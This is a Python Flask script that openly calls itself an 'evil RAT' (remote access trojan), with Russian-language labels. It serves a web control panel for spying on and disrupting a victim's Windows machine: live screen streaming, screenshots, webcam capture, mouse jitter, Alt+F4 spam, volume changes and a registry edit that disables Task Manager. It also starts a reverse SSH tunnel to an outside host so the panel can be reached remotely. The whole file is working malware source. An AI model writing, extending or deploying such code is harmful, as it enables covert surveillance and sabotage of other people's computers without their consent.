from flask import Flask, render_template_string, Response, request
import cv2
import numpy as np
import mss
import pyautogui
import threading
import subprocess
import re
import time
import os

app = Flask(__name__)

# ================== КРАСИВАЯ ВЕБ-ПАНЕЛЬ ==================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>ЗЛОЙ RAT MENU</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: Consolas, monospace;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        h1 { color: #ff0000; margin-bottom: 5px; }
        .tunnel { 
            color: #ffff00; 
            font-size: 18px; 
            margin: 15px; 
            word-break: break-all;
            background: #111;
            padding: 10px;
            border: 1px solid #ffff00;
        }
        button {
            background: #111;
            color: #00ff41;
            border: 2px solid #00ff41;
            padding: 14px 24px;
            margin: 8px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 4px;
        }
        button:hover {
            background: #00ff41;
            color: #000;
        }
        #live {
            border: 4px solid #00ff41;
            margin: 20px auto;
            max-width: 95%;
            box-shadow: 0 0 25px #00ff41;
        }
    </style>
</head>
<body>
    <h1>ЗЛОЙ RAT CONTROL PANEL</h1>
    <div class="tunnel" id="tunnel">Ожидаем туннель от Pinggy...</div>
    
    <img id="live" src="/live" alt="Live Screen">

    <div>
        <button onclick="cmd('screen')">🖥️ Скрин экрана</button>
        <button onclick="cmd('webcam')">📸 Вебкамера</button><br>
        <button onclick="cmd('mousekill')">🖱️ MouseKill</button>
        <button onclick="cmd('altf4')">⌨️ Alt+F4 Spam</button><br>
        <button onclick="cmd('volmax')">🔊 Громкость MAX</button>
        <button onclick="cmd('volmin')">🔇 Громкость MIN</button><br>
        <button onclick="cmd('block')">🔒 Блок Диспетчера</button>
        <button onclick="cmd('wallpaper')">🖼️ Сменить обои</button>
    </div>

    <script>
        function cmd(c) {
            fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({cmd: c})
            }).then(r => r.text()).then(t => alert(t));
        }
    </script>
</body>
</html>
"""

# ================== LIVE STREAM ==================
def gen_frames():
    with mss.mss() as sct:
        while True:
            try:
                screenshot = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
            except:
                time.sleep(0.1)

@app.route('/live')
def live():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ================== КОМАНДЫ ==================
@app.route('/')
def panel():
    return render_template_string(HTML)

@app.route('/command', methods=['POST'])
def command():
    data = request.get_json()
    cmd = data.get('cmd')

    try:
        if cmd == "screen":
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                cv2.imwrite("last_screen.jpg", cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR))
            return "✅ Скрин сделан и сохранён"

        elif cmd == "webcam":
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                return "✅ Вебка сделана"
            return "❌ Вебкамера не найдена"

        elif cmd == "mousekill":
            threading.Thread(target=lambda: [pyautogui.moveRel(60,0,0.03) or pyautogui.moveRel(-60,0,0.03) for _ in range(100)], daemon=True).start()
            return "🖱️ MouseKill запущен"

        elif cmd == "altf4":
            for _ in range(20):
                pyautogui.hotkey('alt', 'f4')
                time.sleep(0.3)
            return "⌨️ Alt+F4 спам выполнен"

        elif cmd == "volmax":
            pyautogui.press('volumeup', presses=50)
            return "🔊 Громкость на максимуме"

        elif cmd == "volmin":
            pyautogui.press('volumedown', presses=50)
            return "🔇 Громкость на минимуме"

        elif cmd == "block":
            os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
            return "🔒 Диспетчер задач заблокирован"

        elif cmd == "wallpaper":
            os.system('reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg" /f')
            os.system('RUNDLL32.exe user32.dll,UpdatePerUserSystemParameters')
            return "🖼️ Обои изменены"

        return "Команда выполнена"
    except Exception as e:
        return f"Ошибка: {str(e)}"

# ================== АВТОЗАПУСК PINGGY ==================
def start_pinggy():
    print("[+] Запускаем Pinggy автоматически...\n")
    
    process = subprocess.Popen(
        ["ssh", "-p", "443", "-R0:127.0.0.1:5000", "tcp@a.pinggy.io"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )

    for line in process.stdout:
        print(line.strip())
        
        # Ищем ссылку туннеля
        match = re.search(r'tcp://([^\s:]+):(\d+)', line)
        if match:
            host = match.group(1)
            port = match.group(2)
            print("\n" + "="*70)
            print("     ТУННЕЛЬ УСПЕШНО ЗАПУЩЕН!")
            print("="*70)
            print(f"Ссылка на панель управления:")
            print(f"→ http://{host}:{port}")
            print("="*70)
            print("Открой эту ссылку в браузере\n")

if __name__ == "__main__":
    print("="*70)
    print("     ЗЛОЙ RAT — АВТОМАТИЧЕСКАЯ ВЕБ-ПАНЕЛЬ")
    print("="*70)

    # Запускаем Pinggy в фоне
    threading.Thread(target=start_pinggy, daemon=True).start()

    # Запускаем веб-сервер
    print("[+] Веб-панель запускается на http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
